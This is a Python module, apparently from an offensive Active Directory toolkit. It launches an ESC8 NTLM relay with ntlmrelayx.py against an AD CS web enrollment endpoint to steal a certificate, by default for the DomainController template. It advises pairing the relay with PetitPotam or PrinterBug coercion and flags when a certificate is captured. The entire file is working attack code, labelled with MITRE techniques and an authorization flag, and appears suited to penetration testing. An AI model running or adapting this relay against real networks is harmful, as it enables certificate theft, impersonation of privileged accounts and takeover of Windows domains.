"""AD CS relay — ESC8 HTTP enrollment relay for certificate theft."""
from __future__ import annotations
import subprocess
import sys
import shutil
from typing import Any
from adxpl.core.credential import ADCredential

MANIFEST = {
    "capability_id": "adxpl.relay.adcs_relay.v1",
    "safety_class": "ACTIVE",
    "requires_authorization": True,
    "side_effects": ["ntlm_relay", "certificate_enrollment"],
    "output_schema": "xpl.finding.v1",
    "mitre": ["T1557.001", "T1649"],
}


def run(args: Any) -> int:
    ca_host = args.target
    template = getattr(args, "adcs_template", "DomainController")
    targets_file = getattr(args, "targets_file", None)

    if not shutil.which("ntlmrelayx.py"):
        print("[!] ntlmrelayx.py not found", file=sys.stderr)
        return 1

    cmd = [
        "ntlmrelayx.py", "-smb2support",
        "-t", "http://{}/certsrv/certfnsh.asp".format(ca_host),
        "--adcs", "--template", template,
    ]

    if targets_file:
        cmd.extend(["-tf", targets_file])

    print("[*] AD CS ESC8 relay → CA={}, template={}".format(ca_host, template))
    print("[*] Waiting for coerced auth to relay to certsrv...")
    print("[*] Command: {}".format(" ".join(cmd)))
    print("[*] Tip: combine with PetitPotam/PrinterBug for coercion source")

    try:
        proc = subprocess.Popen(cmd, stdout=subprocess.PIPE, stderr=subprocess.STDOUT,
                                text=True, bufsize=1)
        print("[+] Relay running (PID {})".format(proc.pid))
        for line in proc.stdout:
            print("  {}".format(line.rstrip()))
            if "certificate" in line.lower() or "base64" in line.lower():
                print("[+] Certificate obtained!")
                break
        return 0
    except KeyboardInterrupt:
        print("\n[*] Relay stopped")
        return 0
    except Exception as exc:
        print("[-] ADCS relay error: {}".format(exc), file=sys.stderr)
        return 1
